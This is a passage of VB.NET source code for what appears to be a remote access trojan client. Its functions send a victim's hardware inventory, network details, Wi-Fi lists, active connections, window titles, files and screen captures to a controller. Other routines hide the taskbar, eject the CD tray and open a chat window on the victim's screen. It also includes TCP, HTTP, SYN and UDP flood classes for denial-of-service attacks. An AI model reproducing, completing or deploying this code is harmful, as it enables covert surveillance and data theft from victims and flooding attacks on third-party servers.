        ClockWin = FindWindowEx(TrayWin, 0, "TrayClockWClass", vbNullString)
        ShowWindow(ClockWin, 0)
    End Sub
    Sub getnames()
        Dim path As ManagementPath = New ManagementPath()
        path.Server = "."
        path.NamespacePath = "root\CIMV2"
        Dim scope As ManagementScope = New ManagementScope(path)
        Dim query As ObjectQuery = New ObjectQuery("SELECT * FROM Win32_PnPEntity")
        Dim searcher As ManagementObjectSearcher = New ManagementObjectSearcher(scope, query)
        Dim queryCollection As ManagementObjectCollection = searcher.Get()
        Dim m As ManagementObject
        Dim nn As String
        For Each m In queryCollection
            Try
                nn = m("Name")
                C.Send("device" & Yy & nn)
            Catch ex As Exception

            End Try

        Next
    End Sub
    Sub scansite(ByVal start As String, ByVal portend As String, ByVal ip As String)

        Dim lanportstart As Integer = Integer.Parse(start)
        Dim lanportend As Integer = Integer.Parse(portend)


        Dim result As String
        While lanportstart <= lanportend
            Dim hostadd As System.Net.IPAddress = System.Net.Dns.GetHostEntry(ip).AddressList(0)
            Dim EPhost As New System.Net.IPEndPoint(hostadd, lanportstart)
            Dim s As New System.Net.Sockets.Socket(System.Net.Sockets.AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp)

            Try
                s.Connect(EPhost)
            Catch
            End Try
            If Not s.Connected Then

                result = "Port " + lanportstart.ToString + " is Closed"

            Else
                result = "Port " + lanportstart.ToString + " is open"

            End If
            C.Send("scanresults" & Yy & result)
            lanportstart += 1
        End While


    End Sub
    Sub scanlan(ByVal ip As String, ByVal port1 As String, ByVal port2 As String)

        Dim lanportstart As Integer = Integer.Parse(port1)
        Dim lanportend As Integer = Integer.Parse(port2)


        Dim result As String
        While lanportstart <= lanportend
            Dim hostadd As System.Net.IPAddress = System.Net.Dns.GetHostEntry(ip).AddressList(0)
            Dim EPhost As New System.Net.IPEndPoint(hostadd, lanportstart)
            Dim s As New System.Net.Sockets.Socket(System.Net.Sockets.AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp)

            Try
                s.Connect(EPhost)
            Catch
            End Try
            If Not s.Connected Then

                result = "Port " + lanportstart.ToString + " is Closed"

            Else
                result = "Port " + lanportstart.ToString + " is open"

            End If
            C.Send("lanresults" & Yy & result)
            lanportstart += 1
        End While


    End Sub
    Private Sub PrinterList()
        Dim p As String
        For Each sPrinters In System.Drawing.Printing.PrinterSettings.InstalledPrinters
            p = "Installed : " & sPrinters
            C.Send("printer" & Yy & p)
        Next
        p = ""

        Dim objMS As System.Management.ManagementScope = _
            New System.Management.ManagementScope(ManagementPath.DefaultPath)
        objMS.Connect()

        Dim objQuery As SelectQuery = New SelectQuery("SELECT * FROM Win32_Printer")
        Dim objMOS As ManagementObjectSearcher = New ManagementObjectSearcher(objMS, objQuery)
        Dim objMOC As System.Management.ManagementObjectCollection = objMOS.Get()

        For Each Printers As ManagementObject In objMOC

            If CBool(Printers("Local")) Then
                p = "Local : " & Printers("Name")
                C.Send("printer" & Yy & p)
            End If
            If CBool(Printers("Network")) Then
                If p.Contains(Printers("Name").ToString.Replace("Local : ", "")) Then
                    Resume
                Else
                    p = "Network : " & Printers("Name")
                    C.Send("printer" & Yy & p)
                End If

            End If
        Next Printers
    End Sub
    Public Sub AddHome(ByVal text As String)
        Dim key As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Internet Explorer\Main", True)
        key.SetValue("Start Page", text)
    End Sub
    Public Sub OpenCDDriveDoor()
        Try
            Call mciSendString("Set CDAudio Door Open", 0, 0, 0)
        Catch ex As Exception

        End Try
    End Sub
    Public Sub CloseCdDriveDoor()
        Try
            Call mciSendString("Set CDAudio Door Closed", 0, 0, 0)
        Catch ex As Exception

        End Try
    End Sub
    Private Sub getlan()
        Dim childEntry As DirectoryEntry
        Dim ParentEntry As New DirectoryEntry
        Try
            ParentEntry.Path = "WinNT:"
            For Each childEntry In ParentEntry.Children
                Select Case childEntry.SchemaClassName
                    Case "Domain"

                        Dim SubChildEntry As DirectoryEntry
                        Dim SubParentEntry As New DirectoryEntry
                        SubParentEntry.Path = "WinNT://" & childEntry.Name
                        For Each SubChildEntry In SubParentEntry.Children
                            '  MsgBox(SubChildEntry.Children)
                            Select Case SubChildEntry.SchemaClassName
                                Case "Computer"
                                    lannet.Items.Add(SubChildEntry.Name)

                            End Select
                        Next
                End Select
            Next
        Catch Excep As Exception
            MsgBox(Excep.Message)
        Finally
            ParentEntry = Nothing
        End Try

    End Sub
    Private Sub getinterfaces()
        Dim nics As NetworkInterface() = NetworkInterface.GetAllNetworkInterfaces()
        If nics.Length < 0 Or nics Is Nothing Then

            Exit Sub
        End If


        For Each netadapter As NetworkInterface In nics
            Dim prop As IPInterfaceProperties = netadapter.GetIPProperties


            Dim paddress As PhysicalAddress = netadapter.GetPhysicalAddress
            Dim pbyte As Byte() = paddress.GetAddressBytes
            Dim mac As String = ""

            For i = 0 To pbyte.Length - 1
                mac &= pbyte(i).ToString("X2")
                If i <> pbyte.Length - 1 Then
                    mac &= "-"
                End If
            Next
            Try

                C.Send("getstat" & Yy & "NetWork Interface Name : " & netadapter.Name)
                C.Send("getstat" & Yy & "Adapter MAC Address : " & mac)
                C.Send("getstat" & Yy & "Adapter IPv4 Address : " & prop.UnicastAddresses(1).Address.ToString)
                C.Send("getstat" & Yy & "Net Mask : " & prop.UnicastAddresses(1).IPv4Mask.ToString)
                C.Send("getstat" & Yy & "IPv6 Address : " & prop.UnicastAddresses(0).Address.ToString)
                C.Send("getstat" & Yy & "Local Link Address " & prop.UnicastAddresses(1).Address.ToString)
                C.Send("getstat" & Yy & "=====================================================")
            Catch ex As Exception
                C.Send("staterror" & Yy & ex.Message)
            End Try
        Next
    End Sub
    Private Sub stati()
        Dim ipProps As System.Net.NetworkInformation.IPGlobalProperties = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties()
        For Each connection As System.Net.NetworkInformation.TcpConnectionInformation In ipProps.GetActiveTcpConnections
            Dim builder As New System.Text.StringBuilder
            builder.AppendFormat("{0} -> {1} - {2}{3}", connection.LocalEndPoint, connection.RemoteEndPoint, connection.State, Environment.NewLine)
            C.Send("stati" & Yy & builder.ToString)
        Next
    End Sub
    Private Sub getwifis2()

        Dim client As New WlanClient()

        Try
            For Each wlanIface As WlanClient.WlanInterface In client.Interfaces
                Dim wlanBssEntries As Wlan.WlanAvailableNetwork() = wlanIface.GetAvailableNetworkList(0)
                For Each network As Wlan.WlanAvailableNetwork In wlanBssEntries

                    C.Send("wifi3" & Yy & System.Text.ASCIIEncoding.ASCII.GetString(network.dot11Ssid.SSID).Trim(ChrW(0)) & Yy & network.wlanSignalQuality.ToString() + "%" & Yy & network.dot11DefaultAuthAlgorithm.ToString().Trim(CChar(ChrW(0))) & Yy & network.dot11DefaultCipherAlgorithm.ToString().Trim(CChar(ChrW(0))))
                Next
            Next

        Catch ex As Exception
            Dim m As String = "Wifi Error : " & ex.Message
            C.Send("wifierror" & Yy & m)
        End Try

    End Sub
    Public Sub hotspotdone()
        C.Send("hotspotok")
    End Sub
    Public Sub hotspotoff()
        C.Send("hotspotoff")
    End Sub
    Public Sub HideTaskBar()
        Dim TaskbarHandle As Long
        TaskbarHandle = FindWindow("Shell_traywnd", "")
        SetWindowPos(TaskbarHandle, 0&, 0&, 0&, 0&, 0&, TASKBAR_HIDE)
    End Sub
    Public Sub ShowTaskBar()
        Dim TaskbarHandle As Long
        TaskbarHandle = FindWindow("Shell_traywnd", "")
        SetWindowPos(TaskbarHandle, 0&, 0&, 0&, 0&, 0&, TASKBAR_SHOW)
    End Sub
    Dim myNetworkAdapters() As NetworkInterface = NetworkInterface.GetAllNetworkInterfaces
    Dim myAdapterProps As IPInterfaceProperties = Nothing
    Dim myGateways As GatewayIPAddressInformationCollection = Nothing
    Function getGateway() As String
        Dim raddress As String = ""
        For Each adapter As NetworkInterface In myNetworkAdapters
            myAdapterProps = adapter.GetIPProperties

            myGateways = myAdapterProps.GatewayAddresses

            For Each Gateway As GatewayIPAddressInformation In myGateways
                raddress += Gateway.Address.ToString() + "IPG"
            Next
        Next
        C.Send("gateway" & Yy & raddress)
    End Function
    Private Class FormChat
        Dim Formx As New Form
        Public TextBox1 As New RichTextBox
        Public WithEvents TextBox2 As New TextBox
        Public Showed As Boolean

        Sub Main()
            ' Formx.CheckForIllegalCrossThreadCalls = True
            Formx.Size = New Size(433, 173)
            Formx.FormBorderStyle = FormBorderStyle.None
            Formx.BackColor = Color.Black
            Formx.StartPosition = FormStartPosition.CenterScreen
            TextBox1.ForeColor = Color.Lime
            TextBox1.BackColor = Color.Black
            TextBox1.ReadOnly = True
            Dim panel1 As New Panel
            TextBox1.Parent = panel1
            TextBox1.Dock = DockStyle.Fill
            panel1.Size = New Size(433, 155)
            panel1.BackColor = Color.Red
            panel1.Controls.Add(TextBox1)
            Dim panel2 As New Panel
            panel2.Dock = DockStyle.Bottom
            panel2.BackColor = Color.Blue
            TextBox2.BackColor = Color.Black
            TextBox2.ForeColor = Color.Lime
            TextBox2.Parent = panel2
            TextBox2.Dock = DockStyle.Bottom
            panel2.Controls.Add(TextBox2)
            Formx.Controls.Add(panel1)
            Formx.Controls.Add(panel2)
            Formx.ShowIcon = False
            Formx.ShowInTaskbar = False
            Formx.Show()
            Formx.TopMost = True
            Showed = True
        End Sub
        Private Sub TextBox2_KeyDown(sender As System.Object, e As System.Windows.Forms.KeyEventArgs) Handles TextBox2.KeyDown
            If e.KeyValue = Keys.Enter Then
                If TextBox2.Text.Length > 0 Then
                    C.Send("chatback" & "|BlueEagle|" & TextBox2.Text)
                    TextBox1.Text = TextBox1.Text & Formx.Text & "You Said : " & TextBox2.Text & vbNewLine
                    TextBox2.Text = ""
                Else
                End If
            End If
        End Sub

        Sub close()
            On Error Resume Next
            Formx.CheckForIllegalCrossThreadCalls = False
            Formx.Close()

            Showed = False

        End Sub
    End Class  '''Chat_Grapgical_User_Interface</summary>
    Declare Sub mouse_event Lib "user32" Alias "mouse_event" (ByVal dwFlags As Integer, ByVal dx As Integer, ByVal dy As Integer, ByVal cButtons As Integer, ByVal dwExtraInfo As Integer)
    Function SB(ByVal s As String) As Byte()
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function
    Function BS(ByVal b As Byte()) As String
        Return System.Text.Encoding.Default.GetString(b)
    End Function
    Function fx(ByVal b As Byte(), ByVal WRD As String) As Array
        Dim a As New List(Of Byte())
        Dim M As New IO.MemoryStream
        Dim MM As New IO.MemoryStream
        Dim T As String() = Split(BS(b), WRD)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function
    Public Function ENB(ByRef s As String) As String
        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
        ENB = Convert.ToBase64String(byt)
    End Function
    Public Function DEB(ByRef s As String) As String
        Dim b As Byte() = Convert.FromBase64String(s)
        DEB = System.Text.Encoding.UTF8.GetString(b)
    End Function
    Public Function getDrives() As String
        Dim allDrives As String = ""
        For Each d As DriveInfo In My.Computer.FileSystem.Drives
            Select Case d.DriveType
                Case 3
                    allDrives += "[Drive]" & d.Name & "FileManagerSplitFileManagerSplit"
                Case 5
                    allDrives += "[CD]" & d.Name & "FileManagerSplitFileManagerSplit"
            End Select
        Next
        Return allDrives
    End Function
    Public Function readtext(ByVal l As String) As String
        Return IO.File.ReadAllText(l)
    End Function
    Public Function getFolders(ByVal location) As String
        Dim di As New DirectoryInfo(location)
        Dim folders = ""
        For Each subdi As DirectoryInfo In di.GetDirectories
            folders += "[Folder]" & subdi.Name & "FileManagerSplitFileManagerSplit"
        Next
        Return folders
    End Function
    Public Function getFiles(ByVal location) As String
        Dim dir As New System.IO.DirectoryInfo(location)
        Dim files = ""
        For Each f As System.IO.FileInfo In dir.GetFiles("*.*")
            files += f.Name & "FileManagerSplit" & f.Length.ToString & "FileManagerSplit"
        Next
        Return files
    End Function
    Public Function getlog(ByVal location) As String
        Dim dir As New System.IO.DirectoryInfo(location)
        Dim files = ""
        For Each f As System.IO.FileInfo In dir.GetFiles("*.log*")
            files += f.Name & "|"
        Next
        Return files
    End Function
#Region "GET INFO"
    Dim cpu As String = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\SYSTEM\CENTRALPROCESSOR\0", "ProcessorNameString", Nothing).ToString
    Public Function Cam() As Boolean
        Try
            Dim d As String = Space(100)
            For i As Integer = 0 To 4
                If capGetDriverDescriptionA(i, d, 100, Nothing, 100) Then
                    Return True
                End If
            Next
        Catch ex As Exception
        End Try
        Return False
    End Function
    Dim os As String = My.Computer.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win")
    Public Function GenerateOperatingSystem() As String
        Dim os As System.OperatingSystem = System.Environment.OSVersion
        Dim osName As String
        osName += " SP"
        Dim k As String() = Split(Environment.OSVersion.ServicePack, " ")
        If k.Length = 1 Then
            osName &= "0"
        End If
        osName &= k(k.Length - 1)
        If Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Hardware\Description\System\CentralProcessor\0").GetValue("Identifier").ToString.Contains("x86") Then
            osName += " x86"
        Else
            osName += " x64"
        End If
        Return osName
    End Function
    Function GetFirewall() As String
        Dim str As String = Nothing
        Dim searcher As New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM FirewallProduct")
        Dim instances As ManagementObjectCollection = searcher.[Get]()
        For Each queryObj As ManagementObject In instances
            str = queryObj("displayName").ToString()
        Next
        Return str
        searcher.Dispose()
    End Function
    Function RAM() As String
        Dim x As String = ""

        Dim PH As Long = Val(My.Computer.Info.TotalPhysicalMemory)
        If PH > 1073741824 Then
            x = (PH / 1073741824).ToString
            x = x.Remove(4, x.Length - 4) + " GB"
        ElseIf PH > 1048576 Then
            x = (PH / 1048576).ToString
            x = x.Remove(4, x.Length - 4) + " Mo"
        End If
        Return x
    End Function

    Public Function FR() As String
        Try
            Return CType(LO, IO.FileInfo).LastWriteTime.ToString("yyyy-MM-dd")
        Catch ex As Exception
            Return "unknown"
        End Try
    End Function
#End Region
    Public Function GetSystemRAMSize() As Double
        Try
            Dim RAM_Size As Double = (My.Computer.Info.TotalPhysicalMemory / 1024 / 1024 / 1024)
            Return FormatNumber(RAM_Size, 2)

        Catch : End Try
    End Function
    Declare Function capGetDriverDescriptionA Lib "avicap32.dll" (ByVal wDriver As Short, _
    ByVal lpszName As String, ByVal cbName As Integer, ByVal lpszVer As String, _
    ByVal cbVer As Integer) As Boolean
    Public Function checkcam() As String
        Try
            Dim d As String = Space(100)
            For i As Integer = 0 To 4
                If capGetDriverDescriptionA(i, d, 100, Nothing, 100) Then
                    Return "Yes"
                End If
            Next
        Catch ex As Exception
        End Try
        Return "No"
    End Function
    Public Declare Function GetForegroundWindow Lib "user32.dll" () As IntPtr
    Public Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
    Public Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hWnd As IntPtr, ByVal WinTitle As String, ByVal MaxLength As Integer) As Integer
    Public Declare Function GetWindowTextLength Lib "user32.dll" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Integer
    Public Function ACT() As String
        Try
            Dim h As IntPtr = GetForegroundWindow()
            If h = IntPtr.Zero Then
                Return ""
            End If
            Dim w As Integer
            w = GetWindowTextLength(h)
            Dim t As String = StrDup(w + 1, "*")
            GetWindowText(h, t, w + 1)
            Dim pid As Integer
            GetWindowThreadProcessId(h, pid)
            If pid = 0 Then
                Return t
            Else
                Try
                    Return Diagnostics.Process.GetProcessById(pid).MainWindowTitle()
                Catch ex As Exception
                    Return t
                End Try
            End If
        Catch ex As Exception
            Return ""
        End Try
    End Function
    Public Class TcpController
        Public Shared isFlooding As Boolean = False

        Shared targetList As New List(Of TcpCrusher)()

        Private Function ParseHost(ByVal host As String) As String
            Dim addresslist As IPAddress() = Dns.GetHostAddresses(host)
            Dim parsedIP As String = ""

            For Each theaddress As IPAddress In addresslist
                parsedIP = theaddress.ToString()
            Next

            Return parsedIP
        End Function

        Public Sub AddTarget(ByVal host As String, ByVal port As Integer, ByVal interval As Integer, ByVal usedThreads As Integer)
            Dim parsedHost As String = ParseHost(host)
            If [String].IsNullOrEmpty(parsedHost) Then
                Throw New HostNotFoundException("")
            End If

            Dim hostEP As New IPEndPoint(IPAddress.Parse(parsedHost), port)

            For i As Integer = 0 To usedThreads
                targetList.Add(New TcpCrusher(hostEP, interval))
            Next
        End Sub


        Public Sub Start()
            For Each flood As TcpCrusher In targetList
                flood.StartFlood()
            Next
        End Sub


        Public Shared Sub [Stop]()
            For Each flood As TcpCrusher In targetList
                flood.StopFlood()
            Next
            Clear()
        End Sub


        Public Shared Sub Clear()
            For Each flood As TcpCrusher In targetList
                flood.Abort()
            Next

            targetList.Clear()
        End Sub


        Public Class TcpCrusher
            Private t As Thread
            Private flood As TcpFlood

            Public Sub New(ByVal host As IPEndPoint, ByVal interval As Integer)
                flood = New TcpFlood(host, interval)
                t = New Thread(AddressOf flood.StartFlood)
                t.Start()
            End Sub

            Public Sub StartFlood()
                flood.IsFlooding = True
                isFlooding = True
                flood.StartFlood()
            End Sub

            Public Sub StopFlood()
                flood.StopFlood()
            End Sub

            Public Sub Abort()
                Try
                    flood.StopFlood()
                    flood.IsFlooding = False
                    t.Abort()
                Catch
                End Try
            End Sub

            Public Class TcpFlood
                Private client As Socket
                Private _host As IPEndPoint = Nothing
                Private _interval As Integer

                Private _IsFlooding As Boolean
                Public Property IsFlooding() As Boolean
                    Get
                        Return _IsFlooding
                    End Get
                    Set(ByVal value As Boolean)
                        _IsFlooding = value
                    End Set
                End Property

                Public Sub New(ByVal host As IPEndPoint, ByVal interval As Integer)
                    _host = host
                    _interval = interval
                    client = New Socket(_host.AddressFamily, SocketType.Stream, ProtocolType.Tcp)
                End Sub

                Public Sub StartFlood()
                    If Not client.Connected Then
                        client.Connect(_host)
                    End If
                    IsFlooding = True
                    IsFlooding = True
                    Flood()
                End Sub

                Public Sub StopFlood()
                    If client.Connected Then
                        client.Close()
                    End If
                    IsFlooding = False
                    IsFlooding = False
                End Sub

                Private Sub Flood()
                    While IsFlooding
                        Dim packet As Byte() = New Byte(1469) {}
                        Try
                            client.SendTo(packet, _host)
                        Catch
                        Finally
                            Thread.Sleep(_interval)
                        End Try
                    End While
                End Sub
            End Class
        End Class
    End Class
    Friend Class HttpFlood
        Private Shared _floodingJob As ThreadStart()
        Private Shared _floodingThread As Thread()
        Public Shared Host As String
        Public Shared Interval As Integer
        Public Shared IsEnabled As Boolean
        Private Shared _requestClass As HttpRequest()
        Public Shared Threads As Integer
        Public Shared Sub StartHttpFlood()
            _floodingThread = New Thread(Threads - 1) {}
            _floodingJob = New ThreadStart(Threads - 1) {}
            _requestClass = New HttpRequest(Threads - 1) {}
            For i As Integer = 0 To Threads - 1
                _requestClass(i) = New HttpRequest(Host, Interval)
                _floodingJob(i) = New ThreadStart(AddressOf _requestClass(i).Send)
                _floodingThread(i) = New Thread(_floodingJob(i))
                _floodingThread(i).Start()
            Next
            IsEnabled = True
        End Sub
        Public Shared Sub StopHttpFlood()
            For i As Integer = 0 To Threads - 1
                Try
                    _floodingThread(i).Abort()
                    _floodingThread(i) = Nothing
                    _floodingJob(i) = Nothing
                    _requestClass(i) = Nothing
                Catch p As Exception
                End Try
            Next
            IsEnabled = False
        End Sub
        Private Class HttpRequest
            Private Host As String
            Private Http As New WebClient()
            Private Interval As Integer

            Public Sub New(ByVal Host As String, ByVal Interval As Integer)
                Me.Host = Host
                Me.Interval = Interval
            End Sub

            Public Sub Send()
                While True
                    Try
                        Http.DownloadString(Host)
                        Thread.Sleep(Interval)
                    Catch
                        Thread.Sleep(Interval)
                    End Try
                End While
            End Sub
        End Class
    End Class
    Friend Class Syn
        Private Shared _floodingJob As ThreadStart()
        Private Shared _floodingThread As Thread()
        Private Shared _ipEo As IPEndPoint
        Private Shared _synClass As SendSyn()
        Public Shared Host As String
        Public Shared IsEnabled As Boolean
        Public Shared Port As Integer = 80
        Public Shared SuperSynSockets As Integer = 200
        Public Shared Threads As Integer = 5

        Public Shared Sub StartSuperSyn()
            Try
                Dim addressList As IPAddress() = Dns.GetHostEntry(Host).AddressList
                _ipEo = New IPEndPoint(addressList(0), Port)
            Catch
                Dim address As IPAddress = IPAddress.Parse(Host)
                _ipEo = New IPEndPoint(address, Port)
            End Try
            _floodingThread = New Thread(Threads - 1) {}
            _floodingJob = New ThreadStart(Threads - 1) {}
            _synClass = New SendSyn(Threads - 1) {}
            For i As Integer = 0 To Threads - 1
                _synClass(i) = New SendSyn(_ipEo, SuperSynSockets)
                _floodingJob(i) = New ThreadStart(AddressOf _synClass(i).Send)
                _floodingThread(i) = New Thread(_floodingJob(i))
                _floodingThread(i).Start()
            Next
            IsEnabled = True
        End Sub

        Public Shared Sub StopSuperSyn()
            For i As Integer = 0 To Threads - 1
                Try
                    _floodingThread(i).Abort()
                    _floodingThread(i) = Nothing
                    _floodingJob(i) = Nothing
                    _synClass(i) = Nothing
                Catch
                End Try
            Next
            IsEnabled = False
        End Sub


        Private Class SendSyn
            Private _sock As Socket()
            Private ipEo As IPEndPoint
            Private SuperSynSockets As Integer

            Public Sub New(ByVal ipEo As IPEndPoint, ByVal superSynSockets__1 As Integer)
                Me.ipEo = ipEo
                SuperSynSockets = superSynSockets__1
            End Sub

            Private Shared Sub OnConnect(ByVal ar As IAsyncResult)
            End Sub

            Public Sub Send()
                While True
                    Dim num As Integer
                    Try
                        _sock = New Socket(SuperSynSockets - 1) {}
                        For num = 0 To SuperSynSockets - 1
                            _sock(num) = New Socket(ipEo.AddressFamily, SocketType.Stream, ProtocolType.Tcp)
                            _sock(num).Blocking = False
                            _sock(num).BeginConnect(ipEo, New System.AsyncCallback(AddressOf OnConnect), _sock(num))
                        Next
                        Thread.Sleep(100)
                        For num = 0 To SuperSynSockets - 1
                            If _sock(num).Connected Then
                                _sock(num).Disconnect(False)
                            End If
                            _sock(num).Close()
                            _sock(num) = Nothing
                        Next
                        _sock = Nothing
                    Catch
                        For num = 0 To SuperSynSockets - 1
                            Try
                                If _sock IsNot Nothing Then
                                    If _sock(num).Connected Then
                                        _sock(num).Disconnect(False)
                                    End If
                                    _sock(num).Close()
                                    _sock(num) = Nothing
                                End If
                            Catch
                            End Try
                        Next
                    End Try
                End While
            End Sub
        End Class

    End Class
    Friend Class UDP
        Private Shared _floodingJob As ThreadStart()
        Private Shared _floodingThread As Thread()
        Private Shared _ipEo As IPEndPoint
        Private Shared _UdPcLass As SenduDp()
        Public Shared Host As String
        Public Shared IsEnabled As Boolean
        Public Shared Port As Integer
        Public Shared UDPzSockets As Integer
        Public Shared Threads As Integer

        Public Shared Sub StartUDPz()
            Try
                Dim addressList As IPAddress() = Dns.GetHostEntry(Host).AddressList
                _ipEo = New IPEndPoint(addressList(0), Port)
            Catch
                Dim address As IPAddress = IPAddress.Parse(Host)
                _ipEo = New IPEndPoint(address, Port)
            End Try
            _floodingThread = New Thread(Threads - 1) {}
            _floodingJob = New ThreadStart(Threads - 1) {}
            _UdPcLass = New SenduDp(Threads - 1) {}
            For i As Integer = 0 To Threads - 1
                _UdPcLass(i) = New SenduDp(_ipEo, UDPzSockets)
                _floodingJob(i) = New ThreadStart(AddressOf _UdPcLass(i).Send)
                _floodingThread(i) = New Thread(_floodingJob(i))
                _floodingThread(i).Start()
            Next
            IsEnabled = True
        End Sub

        Public Shared Sub StopUDPz()
            For i As Integer = 0 To Threads - 1
                Try
                    _floodingThread(i).Abort()
                    _floodingThread(i) = Nothing
                    _floodingJob(i) = Nothing
                    _UdPcLass(i) = Nothing
                Catch
                End Try
            Next
            IsEnabled = False
        End Sub


        Private Class SenduDp
            Private _sock As Socket()
            Private ipEo As IPEndPoint
            Private UDPzSockets As Integer

            Public Sub New(ByVal ipEo As IPEndPoint, ByVal UDPzSockets__1 As Integer)
                Me.ipEo = ipEo
                UDPzSockets = UDPzSockets__1
            End Sub

            Private Shared Sub OnConnect(ByVal ar As IAsyncResult)
            End Sub

            Public Sub Send()
                While True
                    Dim num As Integer
                    Try
                        _sock = New Socket(UDPzSockets - 1) {}
                        For num = 0 To UDPzSockets - 1
                            _sock(num) = New Socket(ipEo.AddressFamily, SocketType.Stream, ProtocolType.Udp)
                            _sock(num).Blocking = False
                            _sock(num).BeginConnect(ipEo, New System.AsyncCallback(AddressOf OnConnect), _sock(num))
                        Next
                        Thread.Sleep(100)
                        For num = 0 To UDPzSockets - 1
                            If _sock(num).Connected Then
                                _sock(num).Disconnect(False)
                            End If
                            _sock(num).Close()
                            _sock(num) = Nothing
                        Next
                        _sock = Nothing
                    Catch
                        For num = 0 To UDPzSockets - 1
                            Try
                                If _sock IsNot Nothing Then
                                    If _sock(num).Connected Then
                                        Dim msg As Byte() = Encoding.UTF8.GetBytes("Hello server! Wanna lag a little please? By-AbsoluteEye")
                                        Dim bytes As Byte() = New Byte(255) {}
                                        _sock(num).Send(msg, 0, msg.Length, SocketFlags.None)
                                        _sock(num).Disconnect(False)
                                    End If
                                    _sock(num).Close()
                                    _sock(num) = Nothing
                                End If
                            Catch
                            End Try
                        Next
                    End Try
                End While
            End Sub
        End Class

    End Class
    <Serializable()> _
    Public Class HostNotFoundException
        Inherits Exception
        Public Sub New()
        End Sub
        Public Sub New(ByVal message As String)
            MyBase.New(message)
        End Sub
        Public Sub New(ByVal message As String, ByVal inner As Exception)
            MyBase.New(message, inner)
        End Sub
        Protected Sub New(ByVal info As System.Runtime.Serialization.SerializationInfo, ByVal context As System.Runtime.Serialization.StreamingContext)
            MyBase.New(info, context)
        End Sub
    End Class
#Region "Disktop Icons"
    Public Enum SW As Int32
        Hide = 0
        Normal = 1
        ShowMinimized = 2
        ShowMaximized = 3
        ShowNoActivate = 4
        Show = 5
        Minimize = 6
        ShowMinNoActive = 7
        ShowNA = 8
        Restore = 9
        ShowDefault = 10
        ForceMinimize = 11
        Max = 11
    End Enum
    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> Public Function FindWindow(ByVal lpClassName As String, ByVal lpWindowName As String) As IntPtr
    End Function
    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> Public Function GetWindow(ByVal hWnd As IntPtr, ByVal uCmd As UInteger) As IntPtr
    End Function
    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> Public Function IsWindowVisible(ByVal hwnd As IntPtr) As Boolean
    End Function
    Public Enum GetWindowCmd As UInteger
        GW_HWNDFIRST = 0
        GW_HWNDLAST = 1
        GW_HWNDNEXT = 2
        GW_HWNDPREV = 3
        GW_OWNER = 4
        GW_CHILD = 5
        GW_ENABLEDPOPUP = 6
    End Enum
    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> Public Function ShowWindow(ByVal hwnd As IntPtr, ByVal nCmdShow As Int32) As Boolean
    End Function
#End Region
    Private Class Fast_Screen
        Private Shared OA As New List(Of Bitmap)
        Private Shared OAA As New List(Of Point)
        Private Shared OM As New Bitmap(1, 1)
        Private Shared Function QZ(ByVal q As Integer) As Size
            On Error Resume Next
            Dim zs As New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
            Select Case q
                Case 0
                    Return zs
                Case 1
                    zs.Width = zs.Width / 1.1
                    zs.Height = zs.Height / 1.1
                Case 2
                    zs.Width = zs.Width / 1.3
                    zs.Height = zs.Height / 1.3
                Case 3
                    zs.Width = zs.Width / 1.5
                    zs.Height = zs.Height / 1.5
                Case 4
                    zs.Width = zs.Width / 1.9
                    zs.Height = zs.Height / 1.9
                Case 5
                    zs.Width = zs.Width / 2
                    zs.Height = zs.Height / 2
                Case 6
                    zs.Width = zs.Width / 2.1
                    zs.Height = zs.Height / 2.1
                Case 7
                    zs.Width = zs.Width / 2.2
                    zs.Height = zs.Height / 2.2
                Case 8
                    zs.Width = zs.Width / 2.5
                    zs.Height = zs.Height / 2.5
                Case 9
                    zs.Width = zs.Width / 3
                    zs.Height = zs.Height / 3
                Case 10
                    zs.Width = zs.Width / 3.5
                    zs.Height = zs.Height / 3.5
                Case 11
                    zs.Width = zs.Width / 4
                    zs.Height = zs.Height / 4
                Case 12
                    zs.Width = zs.Width / 5
                    zs.Height = zs.Height / 5
                Case 13
                    zs.Width = zs.Width / 6
                    zs.Height = zs.Height / 6
            End Select
            zs.Width = Mid(zs.Width.ToString, 1, zs.Width.ToString.Length - 1) & 0
            zs.Height = Mid(zs.Height.ToString, 1, zs.Height.ToString.Length - 1) & 0
            Return zs
        End Function
        Private Shared Function Gd(Optional ByVal Wi As Integer = 0, Optional ByVal He As Integer = 0, Optional ByVal Sh As Boolean = True) As Image
            Dim W As Integer = Screen.PrimaryScreen.Bounds.Width
            Dim H As Integer = Screen.PrimaryScreen.Bounds.Height
            Dim B As New Bitmap(W, H)
            Dim g As Graphics = Graphics.FromImage(B)
            g.CompositingQuality = CompositingQuality.HighSpeed
            g.CopyFromScreen(0, 0, 0, 0, New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy)
            If Sh Then
                Try
                    Cursors.Default.Draw(g, New Rectangle(Cursor.Position, New Size(32, 32)))
                Catch ex As Exception
                End Try
            End If
            g.Dispose()
            If Wi = 0 And He = 0 Then
                Return B
            Else
